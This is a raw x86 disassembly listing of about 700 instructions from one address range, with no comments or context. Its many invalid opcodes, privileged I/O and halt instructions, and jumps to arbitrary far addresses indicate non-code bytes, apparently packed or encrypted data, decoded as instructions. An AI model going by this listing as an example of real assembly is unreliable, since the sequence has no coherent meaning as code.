  41d8de:	shl    BYTE PTR [esi-0x5],0x74
  41d8e2:	jnp    0x41d904
  41d8e4:	mov    dl,0x87
  41d8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d8e7:	in     eax,0xf4
  41d8e9:	stos   BYTE PTR es:[edi],al
  41d8ea:	stos   BYTE PTR es:[edi],al
  41d8eb:	mov    ecx,0x663cda8f
  41d8f0:	js     0x41d918
  41d8f2:	mov    bh,0x45
  41d8f4:	and    bh,dl
  41d8f6:	push   ebp
  41d8f7:	(bad)  [edi]
  41d8f9:	adc    DWORD PTR [ebx+0x6f],esp
  41d8fc:	mov    al,fs:0x3d452c7b
  41d902:	or     eax,0x9c24f0b2
  41d907:	cmp    al,0x2a
  41d909:	mov    al,ds:0xd22f224a
  41d90e:	shl    bh,1
  41d910:	out    dx,al
  41d911:	xchg   esp,eax
  41d912:	in     eax,0x60
  41d914:	popf   
  41d915:	adc    DWORD PTR ds:0xd5d75721,esp
  41d91b:	xor    edx,DWORD PTR [esi-0x7b]
  41d91e:	xchg   edi,eax
  41d91f:	ins    DWORD PTR es:[edi],dx
  41d920:	mov    edi,0x5e8031fe
  41d925:	(bad)  
  41d926:	dec    edx
  41d927:	sbb    edi,DWORD PTR [esi]
  41d929:	sbb    dh,BYTE PTR [eax-0x76001f31]
  41d92f:	mov    eax,0xa0712fe
  41d934:	mov    ch,0x74
  41d936:	in     al,0x4c
  41d938:	jae    0x41d8f6
  41d93a:	jp     0x41d95f
  41d93c:	push   es
  41d93d:	xor    edi,DWORD PTR [ebx+0x54]
  41d940:	sub    esp,DWORD PTR [edi]
  41d942:	into   
  41d943:	sbb    eax,0xed9b265
  41d948:	add    cl,ah
  41d94a:	test   al,ah
  41d94c:	or     eax,0x309733e8
  41d951:	ins    DWORD PTR es:[edi],dx
  41d952:	aas    
  41d953:	and    ebp,0x2c
  41d956:	int3   
  41d957:	ret    
  41d958:	arpl   WORD PTR [ecx-0x792b5e1f],dx
  41d95e:	stos   DWORD PTR es:[edi],eax
  41d95f:	mov    cs,WORD PTR [ebx-0x74]
  41d962:	mul    BYTE PTR [edx]
  41d964:	mov    ds:0xa5f5fc43,al
  41d969:	add    DWORD PTR [edi+esi*2],esi
  41d96c:	xlat   BYTE PTR ds:[ebx]
  41d96d:	in     al,dx
  41d96e:	adc    DWORD PTR [edi],esi
  41d970:	cli    
  41d971:	(bad)  
  41d972:	mov    ah,0x10
  41d974:	test   eax,0x530b90f9
  41d979:	dec    ebx
  41d97a:	pop    esi
  41d97b:	and    dl,bl
  41d97d:	xchg   ecx,eax
  41d97e:	and    eax,0xc3d60279
  41d983:	jge    0x41d9fd
  41d985:	into   
  41d986:	mov    ds:0x515e949,al
  41d98b:	dec    ecx
  41d98c:	dec    BYTE PTR [ecx]
  41d98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d98f:	inc    eax
  41d990:	in     eax,dx
  41d991:	cld    
  41d992:	pop    esp
  41d993:	loop   0x41da0c
  41d995:	les    eax,FWORD PTR [ebx-0x7c]
  41d998:	add    BYTE PTR [eax-0x45],ch
  41d99b:	test   eax,0xf076d14a
  41d9a0:	(bad)  
  41d9a1:	mov    DWORD PTR [ebx+0x3f16da2],esi
  41d9a7:	popf   
  41d9a8:	xor    esi,DWORD PTR [edi-0x5b]
  41d9ab:	loope  0x41da1e
  41d9ad:	jmp    0x41d9e3
  41d9af:	daa    
  41d9b0:	or     BYTE PTR [edi],0xcc
  41d9b3:	repz push ebp
  41d9b5:	sub    cl,0xf2
  41d9b8:	es fstp st(7)
  41d9bb:	nop
  41d9bc:	popa   
  41d9bd:	xchg   DWORD PTR [esi+ebp*8-0x6db35dcf],edx
  41d9c4:	pop    edi
  41d9c5:	call   0x4a374e86
  41d9ca:	pop    ebp
  41d9cb:	push   ecx
  41d9cc:	ret    
  41d9cd:	mov    WORD PTR cs:[edx-0x56],ss
  41d9d1:	and    BYTE PTR [ecx+0x7d],ah
  41d9d4:	dec    ebx
  41d9d5:	shl    BYTE PTR [edi-0x5a],cl
  41d9d8:	jne    0x41d9d3
  41d9da:	loopne 0x41da44
  41d9dc:	pop    ebp
  41d9dd:	jmp    0x41d98b
  41d9df:	mov    edx,0x8d3aaa46
  41d9e4:	fwait
  41d9e5:	or     dh,BYTE PTR fs:[edi-0x3c8cc83b]
  41d9ec:	jmp    0x41d96e
  41d9ee:	jne    0x41da5e
  41d9f0:	xchg   edi,eax
  41d9f1:	pop    ss
  41d9f2:	nop
  41d9f3:	adc    al,BYTE PTR [ecx]
  41d9f5:	test   esp,ebp
  41d9f7:	sub    DWORD PTR [edx],ecx
  41d9f9:	dec    esi
  41d9fa:	mov    al,ds:0x78524bbe
  41d9ff:	xchg   ebp,eax
  41da00:	pop    ss
  41da01:	imul   edi,DWORD PTR [ecx+0x6e4d236],0x7e494842
  41da0b:	iret   
  41da0c:	add    al,0x11
  41da0e:	push   ebx
  41da0f:	cmc    
  41da10:	adc    eax,0xd9530f50
  41da15:	stos   BYTE PTR es:[edi],al
  41da16:	inc    edx
  41da17:	dec    eax
  41da18:	fisub  WORD PTR [edi]
  41da1a:	lods   al,BYTE PTR ds:[esi]
  41da1b:	pop    esp
  41da1c:	pop    ebp
  41da1d:	mov    al,0xf1
  41da1f:	sbb    DWORD PTR [ebp-0x4e],eax
  41da22:	inc    ebp
  41da23:	dec    esp
  41da24:	xchg   esp,eax
  41da25:	or     BYTE PTR [esi],ah
  41da27:	into   
  41da28:	mov    al,0x41
  41da2a:	ja     0x41da65
  41da2c:	push   ds
  41da2d:	jns    0x41da6f
  41da2f:	arpl   WORD PTR [eax+esi*8],bp
  41da32:	fmul   QWORD PTR [eax-0x2c]
  41da35:	dec    ebx
  41da36:	xchg   esp,eax
  41da37:	mov    eax,0xd10544ee
  41da3c:	jecxz  0x41daab
  41da3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da3f:	sub    dh,dh
  41da41:	call   0x54e0:0x511b4d95
  41da48:	mov    ecx,0x9e39e4b1
  41da4d:	retf   
  41da4e:	lods   al,BYTE PTR ds:[esi]
  41da4f:	cld    
  41da50:	xchg   ah,ah
  41da52:	cdq    
  41da53:	int    0x3e
  41da55:	stos   BYTE PTR es:[edi],al
  41da56:	gs dec ebp
  41da58:	jp     0x41da93
  41da5a:	mov    ds:0x84059e0c,eax
  41da5f:	xchg   ebp,eax
  41da60:	leave  
  41da61:	sub    BYTE PTR [edi+ebp*8-0x80],0x80
  41da66:	inc    ebp
  41da67:	retf   
  41da68:	xchg   esp,eax
  41da69:	inc    eax
  41da6a:	js     0x41dad8
  41da6c:	sbb    edi,DWORD PTR ds:0x3d18bdde
  41da72:	(bad)  
  41da74:	adc    DWORD PTR [ecx+0x7b],0xffffffd5
  41da78:	mov    ah,0xef
  41da7a:	dec    ebx
  41da7b:	adc    esp,DWORD PTR [edx-0x71]
  41da7e:	out    0x39,eax
  41da80:	push   esp
  41da81:	add    eax,DWORD PTR [ebp+0x28a5a31a]
  41da87:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41da88:	stos   DWORD PTR es:[edi],eax
  41da89:	out    dx,eax
  41da8a:	dec    ebx
  41da8b:	fnstsw WORD PTR [eax+0x24aaf96d]
  41da91:	mov    edx,0xbae534dc
  41da96:	mov    dh,0x5e
  41da98:	loop   0x41da2a
  41da9a:	sar    DWORD PTR [edi+0x54a9d5d7],1
  41daa0:	mov    esi,0x5ebd9799
  41daa5:	popf   
  41daa6:	popa   
  41daa7:	or     al,0xe3
  41daa9:	inc    ebp
  41daaa:	or     eax,0x228ea298
  41daaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dab0:	xchg   DWORD PTR [ebp-0x27],esp
  41dab3:	xlat   BYTE PTR ds:[ebx]
  41dab4:	fisub  WORD PTR [ecx+ebp*4+0xb]
  41dab8:	scas   al,BYTE PTR es:[edi]
  41dab9:	test   al,0xab
  41dabb:	dec    ebx
  41dabc:	in     al,dx
  41dabd:	aad    0xa8
  41dabf:	add    BYTE PTR [ebx],dl
  41dac1:	pop    es
  41dac2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dac3:	outs   dx,DWORD PTR ds:[esi]
  41dac4:	adc    al,0xaa
  41dac6:	lods   al,BYTE PTR ds:[esi]
  41dac7:	mov    al,0xb4
  41dac9:	pop    esi
  41daca:	fucomp st(4)
  41dacc:	jmp    0x220eb866
  41dad1:	dec    esi
  41dad2:	pop    ds
  41dad3:	les    ebp,FWORD PTR [edi]
  41dad5:	adc    al,0x3f
  41dad7:	mov    ds:0xa6758335,eax
  41dadc:	mov    esp,DWORD PTR [ebx+0x27]
  41dadf:	adc    al,0xc7
  41dae1:	mov    al,0xe2
  41dae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dae4:	shr    ebp,cl
  41dae6:	into   
  41dae7:	inc    esi
  41dae8:	dec    ecx
  41dae9:	sti    
  41daea:	mov    al,ds:0xbd95f0f5
  41daef:	out    dx,eax
  41daf0:	cmp    bl,BYTE PTR ds:0xd1bf4cbf
  41daf6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daf7:	sub    DWORD PTR [esi],edx
  41daf9:	loope  0x41da88
  41dafb:	sti    
  41dafc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dafd:	in     eax,dx
  41dafe:	xor    eax,0x57c5641c
  41db04:	(bad)  
  41db05:	jns    0x41db45
  41db07:	fist   DWORD PTR [ebp-0x68]
  41db0a:	bound  ebp,QWORD PTR [ebx+eiz*2+0x37]
  41db0e:	inc    eax
  41db0f:	xor    BYTE PTR [ebx],al
  41db11:	pop    esi
  41db12:	es sub eax,0x98b64c0b
  41db18:	sti    
  41db19:	mov    al,ds:0x8fc7a082
  41db1e:	mov    ds:0xaa3ab772,al
  41db23:	fsub   st(1),st
  41db25:	mov    ebx,0xfcffbac3
  41db2a:	or     DWORD PTR [edi+0xfb46a22],0xffffff84
  41db31:	jmp    0x41db6b
  41db33:	(bad)  
  41db34:	fisttp WORD PTR [ebx]
  41db36:	mov    ds:0xc2d7c609,al
  41db3b:	rcl    BYTE PTR fs:[ebx-0x56768851],1
  41db42:	jnp    0x41db92
  41db44:	fcomp  DWORD PTR [ebx+eiz*4+0x10]
  41db48:	dec    esi
  41db49:	hlt    
  41db4a:	add    al,0xeb
  41db4c:	outs   dx,DWORD PTR ds:[esi]
  41db4d:	mov    al,0xaf
  41db4f:	hlt    
  41db50:	or     BYTE PTR [ebx+0x32bb0945],0x5c
  41db57:	mov    ebp,0xc8c99c25
  41db5c:	outs   dx,BYTE PTR ds:[esi]
  41db5d:	cwde   
  41db5e:	push   ebx
  41db5f:	dec    ecx
  41db60:	mov    al,ds:0xcb13cfa2
  41db65:	dec    ebx
  41db66:	mov    es:0x694b127,eax
  41db6c:	jne    0x41dbd2
  41db6e:	jp     0x41db9d
  41db70:	dec    eax
  41db71:	imul   edx,DWORD PTR [ebx+0x639ef22d],0x3a
  41db78:	jmp    0x41dafd
  41db7a:	rcr    DWORD PTR [ecx],cl
  41db7c:	jo     0x41db8f
  41db7e:	and    DWORD PTR [esi-0x2dfe0bce],eax
  41db84:	push   esi
  41db85:	inc    edi
  41db86:	clc    
  41db87:	jo     0x41db10
  41db89:	push   cs
  41db8a:	add    BYTE PTR [edx+0x11],bl
  41db8d:	mov    DWORD PTR [edx-0x27eaa4f8],0x171704f4
  41db97:	cmc    
  41db98:	xor    BYTE PTR [edx+0x1e],dl
  41db9b:	outs   dx,DWORD PTR ds:[esi]
  41db9c:	retf   
  41db9d:	dec    ebx
  41db9e:	bound  ebp,QWORD PTR [edx+ebp*2]
  41dba1:	mov    ecx,0x535b3786
  41dba6:	xor    eax,0x7ae74169
  41dbab:	push   ds
  41dbac:	aaa    
  41dbad:	ds dec esi
  41dbaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbb0:	add    DWORD PTR [ebx+edx*2-0x500121cb],eax
  41dbb7:	or     DWORD PTR [edi],0x4eeadd0b
  41dbbd:	dec    esi
  41dbbe:	sti    
  41dbbf:	cmp    al,BYTE PTR [edi+0x363bda47]
  41dbc5:	int    0xe9
  41dbc7:	fbstp  TBYTE PTR [ebp-0x6ab95ee0]
  41dbcd:	cmp    eax,DWORD PTR [edx]
  41dbcf:	sahf   
  41dbd0:	loop   0x41db54
  41dbd2:	fsub   DWORD PTR [edx]
  41dbd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbd5:	or     eax,0xcb312bad
  41dbda:	and    eax,0xe6f62f36
  41dbdf:	nop
  41dbe0:	jae    0x41dbaa
  41dbe2:	aas    
  41dbe3:	arpl   cx,si
  41dbe5:	stos   DWORD PTR es:[edi],eax
  41dbe6:	mov    bl,0xe0
  41dbe8:	or     eax,ebx
  41dbea:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41dbec:	inc    ecx
  41dbed:	adc    eax,0xda65c4e9
  41dbf2:	jge    0x41dbf2
  41dbf4:	jmp    0x4b64:0xc2eff4de
  41dbfb:	mov    edx,0x17f527ec
  41dc00:	rcl    BYTE PTR [eax+eiz*1+0x19],cl
  41dc04:	ficomp DWORD PTR [ebx-0x5eb04f3c]
  41dc0a:	icebp  
  41dc0b:	push   eax
  41dc0c:	cwde   
  41dc0d:	(bad)  
  41dc0e:	fistp  WORD PTR [ebx-0x30]
  41dc11:	and    al,0x23
  41dc13:	add    BYTE PTR [edi+eiz*2],bh
  41dc16:	enter  0x4ec4,0xcf
  41dc1a:	inc    edi
  41dc1b:	int    0x86
  41dc1d:	xchg   ebp,eax
  41dc1e:	or     BYTE PTR [edx+0x10],0xec
  41dc22:	cmp    eax,0x82fdbfaa
  41dc27:	mov    ?,WORD PTR [eax-0x68]
  41dc2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc2b:	dec    ecx
  41dc2c:	sbb    al,0xc2
  41dc2e:	push   es
  41dc2f:	jle    0x41dc0f
  41dc31:	out    0x7e,al
  41dc33:	ss (bad) 
  41dc35:	inc    DWORD PTR [esi+esi*1-0xcf9e932]
  41dc3c:	bound  edi,QWORD PTR [ebx]
  41dc3e:	xor    eax,0xf30ad6d3
  41dc43:	jmp    FWORD PTR [esi+0x4c58380c]
  41dc49:	push   ss
  41dc4a:	ja     0x41dc28
  41dc4c:	jae    0x41dc88
  41dc4e:	out    0xb3,eax
  41dc50:	sahf   
  41dc51:	and    BYTE PTR [eax],dh
  41dc53:	pop    ebp
  41dc54:	pop    ss
  41dc55:	js     0x41dbfb
  41dc57:	aas    
  41dc58:	sub    DWORD PTR [edi-0x50],0x35ae5f2c
  41dc5f:	jno    0x41dc0f
  41dc61:	add    DWORD PTR [ebx-0x6c204d9e],0xf6ea8168
  41dc6b:	sar    esi,0x75
  41dc6e:	loopne 0x41dc62
  41dc70:	add    al,0xa9
  41dc72:	cmp    edi,edi
  41dc74:	loop   0x41dcd1
  41dc76:	stos   BYTE PTR es:[edi],al
  41dc77:	mov    ebp,0x3c2a0c68
  41dc7c:	loop   0x41dca2
  41dc7e:	pop    ss
  41dc7f:	(bad)  
  41dc80:	or     ecx,DWORD PTR [esp+ebp*8-0xb0d312b]
  41dc87:	adc    bh,cl
  41dc89:	cmc    
  41dc8a:	pop    ebp
  41dc8b:	ins    BYTE PTR es:[edi],dx
  41dc8c:	push   ss
  41dc8d:	inc    edx
  41dc8e:	call   0xeb040aa4
  41dc93:	(bad)  
  41dc94:	std    
  41dc95:	test   BYTE PTR [edx+0x66efcb0c],al
  41dc9b:	mov    ecx,DWORD PTR [edi+ebp*2+0x6f77e741]
  41dca2:	pop    ebx
  41dca3:	hlt    
  41dca4:	mov    ebp,0xf904b092
  41dca9:	ror    BYTE PTR [edx+0xc],cl
  41dcac:	adc    esi,edx
  41dcae:	aad    0x84
  41dcb0:	xchg   ebp,eax
  41dcb1:	xchg   edx,eax
  41dcb3:	or     al,0x32
  41dcb5:	push   es
  41dcb6:	mov    edx,0xf2e2bee7
  41dcbb:	push   edx
  41dcbc:	mov    edx,0x34e262b3
  41dcc1:	mov    esp,0xba4f290e
  41dcc6:	adc    eax,0xb48b061c
  41dccb:	repnz adc DWORD PTR ds:0x3743f7b5,esi
  41dcd2:	and    eax,0xcdee468c
  41dcd7:	mov    ecx,0xc7c534a9
  41dcdc:	dec    esp
  41dcdd:	cs out dx,eax
  41dcdf:	cli    
  41dce0:	jg     0x41dc7a
  41dce2:	js     0x41dc78
  41dce4:	loope  0x41dc73
  41dce6:	mov    eax,ds:0x16793774
  41dceb:	aam    0x75
  41dced:	jmp    0x6dfd7c27
  41dcf2:	xchg   ecx,eax
  41dcf3:	fcom   DWORD PTR ds:0x909f9d6e
  41dcf9:	icebp  
  41dcfa:	push   edi
  41dcfb:	lahf   
  41dcfc:	test   eax,edi
  41dcfe:	xchg   ecx,eax
  41dcff:	add    al,0x3f
  41dd01:	inc    esp
  41dd02:	lds    edi,FWORD PTR [esi-0x3c2d4998]
  41dd08:	cmc    
  41dd09:	test   BYTE PTR [eax],ch
  41dd0b:	dec    edx
  41dd0c:	jo     0x41dd16
  41dd0e:	xchg   ecx,eax
  41dd0f:	jo     0x41dcf6
  41dd11:	shl    esi,cl
  41dd13:	cmc    
  41dd14:	(bad)  
  41dd15:	(bad)  
  41dd16:	outs   dx,BYTE PTR ds:[esi]
  41dd17:	jmp    0xe1381502
  41dd1c:	fisubr WORD PTR [ebp-0x83a23e1]
  41dd22:	jmp    0x41dd05
  41dd24:	daa    
  41dd25:	and    BYTE PTR [ecx-0x2e],bh
  41dd28:	cmp    ch,ch
  41dd2a:	arpl   WORD PTR [ebp+0x2f],dx
  41dd2d:	mov    ds:0x788be8ad,eax
  41dd32:	hlt    
  41dd33:	cli    
  41dd34:	into   
  41dd35:	dec    esi
  41dd36:	mov    ebp,0xfb810c99
  41dd3b:	rol    DWORD PTR [ebp-0x4d4b3d1a],1
  41dd41:	je     0x41dcd9
  41dd43:	mov    edi,0xdcca54a7
  41dd48:	loop   0x41dcd0
  41dd4a:	pop    ds
  41dd4b:	imul   ebx,DWORD PTR [ebx+0x48],0xe5826266
  41dd52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd53:	addr16 mov edi,0xaf34100b
  41dd59:	jmp    0x41dd65
  41dd5b:	fwait
  41dd5c:	dec    edx
  41dd5d:	and    eax,0x96a5e88e
  41dd62:	push   0x93153509
  41dd67:	sub    dh,BYTE PTR [ebp-0x2e]
  41dd6a:	xchg   ecx,eax
  41dd6b:	mov    edi,0x9fae894
  41dd70:	add    dh,BYTE PTR [esi]
  41dd72:	jle    0x41dd6f
  41dd74:	pop    edi
  41dd75:	and    BYTE PTR [edx],ch
  41dd77:	mov    ecx,0xda393482
  41dd7c:	mov    bl,0xfe
  41dd7e:	mov    esi,0xc54c98e6
  41dd83:	imul   ebx,DWORD PTR [ecx+0x4812e1e4],0x92663a76
  41dd8d:	lock lea edi,[esi]
  41dd90:	push   0x25f9ea14
  41dd95:	adc    BYTE PTR ds:0xfcd0f29d,al
  41dd9b:	lahf   
  41dd9c:	sub    dh,BYTE PTR [ecx-0x48d33d49]
  41dda2:	je     0x41dd6b
  41dda4:	inc    eax
  41dda5:	mov    esp,0x47aade80
  41ddaa:	fcomp  QWORD PTR [edi+0x668bfd13]
  41ddb0:	in     eax,dx
  41ddb1:	sub    BYTE PTR [edi-0x34],dh
  41ddb4:	jns    0x41dd61
  41ddb6:	mov    DWORD PTR [ebx],ebx
  41ddb8:	pop    edi
  41ddb9:	in     eax,dx
  41ddba:	xor    ah,BYTE PTR [edi+0x11]
  41ddbd:	push   0x2b
  41ddbf:	loope  0x41ddd7
  41ddc1:	jns    0x41dd8d
  41ddc3:	mov    dl,0xa0
  41ddc5:	cmp    edi,DWORD PTR [edx-0xb]
  41ddc8:	das    
  41ddc9:	stos   BYTE PTR es:[edi],al
  41ddca:	jg     0x41de0a
  41ddcc:	push   ebp
  41ddcd:	test   al,0x39
  41ddcf:	loop   0x41de2e
  41ddd1:	push   edi
  41ddd2:	call   DWORD PTR [edi-0xc]
  41ddd5:	pusha  
  41ddd6:	xchg   DWORD PTR [ecx-0x3a],ebp
  41ddd9:	xchg   BYTE PTR [ecx+0x4d],dh
  41dddc:	retf   0x357c
  41dddf:	dec    ebp
  41dde0:	cs pop ebx
  41dde2:	cmp    al,0x65
  41dde4:	js     0x41ddf2
  41dde6:	test   eax,0xcc80e655
  41ddeb:	mov    esp,0xcaa45f98
  41ddf0:	(bad)  
  41ddf1:	lahf   
  41ddf2:	mov    al,ds:0xff01dde
  41ddf7:	jle    0x41dde6
  41ddf9:	dec    edx
  41ddfa:	or     cl,BYTE PTR [ebx-0xf]
  41ddfd:	cld    
  41ddfe:	(bad)
  41de01:	outs   dx,BYTE PTR ds:[esi]
  41de02:	inc    ebp
  41de03:	sub    esi,0xffffffa2
  41de06:	repnz cmp eax,0xa21aa268
  41de0c:	jne    0x41dda1
  41de0e:	or     ch,BYTE PTR ds:0xc60176ec
  41de14:	mov    ah,0xf7
  41de16:	loope  0x41de6e
  41de18:	push   ebx
  41de19:	and    DWORD PTR [edx-0x1508aa0f],0x70522f4a
  41de23:	rcl    dh,0xb5
  41de26:	iret   
  41de27:	outs   dx,DWORD PTR ds:[esi]
  41de28:	xchg   edx,eax
  41de29:	mov    ?,WORD PTR [esi-0xa422b5c]
  41de2f:	push   eax
  41de30:	dec    eax
  41de31:	mov    ds:0xfe192941,eax
  41de36:	mov    ds:0x9a36c6fb,al
  41de3b:	pop    es
  41de3c:	push   cs
  41de3d:	or     edi,DWORD PTR [ecx+0x5bfa7b1c]
  41de43:	aad    0x5f
  41de45:	in     eax,dx
  41de46:	mov    dl,0x46
  41de48:	jbe    0x41de6e
  41de4a:	cmp    ah,bl
  41de4c:	pop    eax
  41de4d:	jecxz  0x41de8d
  41de4f:	(bad)  
  41de50:	fmul   DWORD PTR [ebx-0x3a551938]
  41de56:	adc    BYTE PTR [esp+ebp*1-0x74],dl
  41de5a:	mov    ds:0xa8ae148a,eax
  41de5f:	pop    ss
  41de60:	and    DWORD PTR [edi],ebp
  41de62:	jmp    0x73de:0xf39e4e8c
  41de69:	daa    
  41de6a:	lods   eax,DWORD PTR ds:[esi]
  41de6b:	aam    0x8d
  41de6d:	sbb    al,0xcd
  41de6f:	jbe    0x41def0
  41de71:	push   eax
  41de72:	push   edx
  41de73:	bound  edi,QWORD PTR [ebp+0x56f171d5]
  41de79:	pop    ebx
  41de7a:	mov    ds:0x9b9982fa,eax
  41de7f:	mov    ds:0x552e8b7,eax
  41de84:	jae    0x41de2f
  41de86:	pop    es
  41de87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de88:	dec    eax
  41de89:	lahf   
  41de8a:	rcl    DWORD PTR [edx+ebx*4],1
  41de8d:	je     0x41dea9
  41de8f:	dec    edx
  41de90:	out    dx,eax
  41de91:	imul   esp,DWORD PTR [eax+0x239829a9],0x73bd640
  41de9b:	and    BYTE PTR [edx+ecx*2-0x6cd8a53b],bh
  41dea2:	xchg   esi,eax
  41dea3:	sub    edx,DWORD PTR [edx+ebp*2+0xcc9acba]
  41deaa:	push   ebx
  41deab:	or     ch,BYTE PTR [edi-0x37a71210]
  41deb1:	dec    edi
  41deb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41deb3:	ror    bl,1
  41deb5:	adc    eax,0xc4ddacc4
  41deba:	cmp    ebx,DWORD PTR [esi+eax*4-0x8]
  41debe:	fiadd  DWORD PTR [ebx+0x16]
  41dec1:	icebp  
  41dec2:	mov    edi,0xf0aadac
  41dec7:	fisubr WORD PTR [ecx+0x37]
  41deca:	mov    DWORD PTR [ebp+0x5ee4e95e],ebx
  41ded0:	push   ds
  41ded1:	jnp    0x41de7f
  41ded3:	sub    al,BYTE PTR [ecx+ebx*8+0x523d88cc]
  41deda:	inc    ebp
  41dedb:	leave  
  41dedc:	jae    0x41df16
  41dede:	or     ah,BYTE PTR [ebp-0x49f12552]
  41dee4:	push   ds
  41dee5:	jge    0x41dedb
  41dee7:	mov    edx,0x1b9f022d
  41deec:	jno    0x41df31
  41deee:	aad    0xa3
  41def0:	mov    ecx,0xe77bd311
  41def5:	test   al,0xfa
  41def7:	jecxz  0x41df58
  41def9:	fwait
  41defa:	and    BYTE PTR [ebx],bh
  41defc:	or     ecx,0x7
  41deff:	gs pop ebx
  41df01:	xor    al,ch
  41df03:	js     0x41ded3
  41df05:	add    DWORD PTR [edi+0x4ea37ed8],0xd24abf37
  41df0f:	xchg   ebp,eax
  41df10:	push   cs
  41df11:	cmp    esi,edi
  41df13:	or     edx,DWORD PTR [edi]
  41df15:	pop    ecx
  41df16:	push   es
  41df17:	shl    eax,cl
  41df19:	test   DWORD PTR ds:0x913ce651,ebp
  41df1f:	pop    es
  41df20:	daa    
  41df21:	and    bl,BYTE PTR [eax]
  41df23:	pusha  
  41df24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df25:	in     al,0xd0
  41df27:	mov    dl,0x12
  41df29:	dec    eax
  41df2a:	add    eax,0x8e183ffd
  41df2f:	sti    
  41df30:	mov    eax,ds:0x8c33fe99
  41df35:	test   cl,cl
  41df37:	xor    edx,edx
  41df39:	dec    edx
  41df3a:	mov    ebp,0x75487d74
  41df3f:	lods   al,BYTE PTR ds:[esi]
  41df40:	fwait
  41df41:	push   esp
  41df42:	retf   
  41df43:	sub    ecx,DWORD PTR [eax+esi*2]
  41df46:	dec    eax
  41df47:	mov    ah,0xd3
  41df49:	push   edx
  41df4a:	add    BYTE PTR [esi+ebx*4+0x3615bd46],0xc9
  41df52:	in     al,dx
  41df53:	adc    BYTE PTR [esi],ch
  41df55:	fcmove st,st(5)
  41df57:	hlt    
  41df58:	jns    0x41df8e
  41df5a:	pop    eax
  41df5b:	arpl   bx,sp
  41df5d:	jmp    0x41d2:0x27a411e1
  41df64:	ja     0x41dfd8
  41df66:	jnp    0x41dee9
  41df68:	test   eax,0x6dce4fbe
  41df6d:	pop    ss
  41df6e:	xor    eax,0xa2c3f283
  41df73:	dec    edx
  41df74:	retf   
  41df75:	add    ch,dh
  41df77:	jbe    0x41dfad
  41df79:	retf   
  41df7a:	arpl   WORD PTR [edi+ecx*1+0x19],si
  41df7e:	xor    DWORD PTR [edi-0x5b0a76bc],ebx
  41df84:	xchg   edx,eax
  41df85:	cmp    al,BYTE PTR [edx]
  41df87:	and    al,0x8d
  41df89:	jno    0x41dfab
  41df8b:	(bad)
  41df8e:	or     DWORD PTR [ecx+0x745b1f9d],eax
  41df94:	ins    DWORD PTR es:[edi],dx
  41df95:	shl    DWORD PTR [edi+ebx*1],1
  41df98:	pop    esp
  41df99:	sti    
  41df9a:	xor    eax,0xa2ed8e7c
  41df9f:	(bad)  [esi]
  41dfa1:	in     eax,0xde
  41dfa3:	or     edx,esp
  41dfa5:	into   
  41dfa6:	and    eax,0xf12d7ad9
  41dfab:	popa   
  41dfac:	or     BYTE PTR [ebx],bl
  41dfae:	ret    0xaf67
  41dfb1:	xchg   ebx,eax
  41dfb2:	mov    esi,eax
  41dfb4:	and    ch,cl
  41dfb6:	shl    BYTE PTR [edx-0x5a9cf11f],0x3a
  41dfbd:	ds inc esp
  41dfbf:	(bad)  
  41dfc0:	push   0x87f41370
  41dfc5:	(bad)  [esi-0x50e8d9dd]
  41dfcb:	retf   0x2c1
  41dfce:	jp     0x41df63
  41dfd0:	jo     0x41df8a
  41dfd2:	out    0xfa,eax
  41dfd4:	sbb    eax,0x216dc775
  41dfd9:	xchg   ecx,eax
  41dfda:	inc    esi
  41dfdb:	jg     0x41df5e
  41dfdd:	or     ah,BYTE PTR [esi-0x3548950a]
  41dfe3:	(bad)
  41dfe7:	and    eax,0x1029c3ee
  41dfec:	pop    ebx
  41dfed:	imul   edi,DWORD PTR ds:0x1f78789b,0xec52918e
  41dff7:	jb     0x41e007
  41dff9:	xor    ah,BYTE PTR [ebp+0xa4251b6]
  41dfff:	push   ecx
  41e000:	sub    DWORD PTR [ecx],0xffffffa8
  41e003:	jb     0x41e028
  41e005:	loope  0x41dfae
  41e007:	(bad)
  41e00a:	inc    edx
  41e00b:	rcl    BYTE PTR [eax],cl
  41e00d:	lods   al,BYTE PTR ds:[esi]
  41e00e:	rcl    DWORD PTR ds:0xb46104a9,1
  41e014:	lock (bad) 
  41e017:	push   cs
  41e018:	xlat   BYTE PTR ds:[ebx]
  41e019:	mov    bh,0x7
  41e01b:	in     al,0x6
  41e01d:	sub    al,0x6
  41e01f:	es jne 0x41e045
  41e022:	inc    ebp
  41e023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e024:	inc    ecx
  41e025:	sub    BYTE PTR [edi-0x328c9226],bl
  41e02b:	dec    edx
  41e02c:	dec    ebx
  41e02d:	adc    eax,0xf1ce9eea
  41e032:	mov    es,edi
  41e034:	in     eax,0x57
  41e036:	or     DWORD PTR [eax+0x2544761b],eax
  41e03c:	sahf   
  41e03d:	push   ebx
  41e03e:	xor    al,0x4a
  41e040:	fidivr WORD PTR [ebx]
  41e042:	mov    ds:0x1dda8a2a,eax
  41e047:	nop
  41e048:	lods   eax,DWORD PTR ds:[esi]
  41e049:	sub    al,0x6d
  41e04b:	and    eax,0x91faf38a
  41e050:	cmp    esi,ecx
  41e052:	or     dl,cl
  41e054:	push   es
  41e055:	push   ebp
  41e056:	or     eax,0x6b4a1afd
  41e05b:	jmp    DWORD PTR [eax-0x3244ca05]
  41e061:	inc    ebx
  41e062:	cmp    DWORD PTR [eax],esi
  41e064:	mov    WORD PTR [edi+esi*4-0x25],ds
  41e068:	cmp    al,0x49
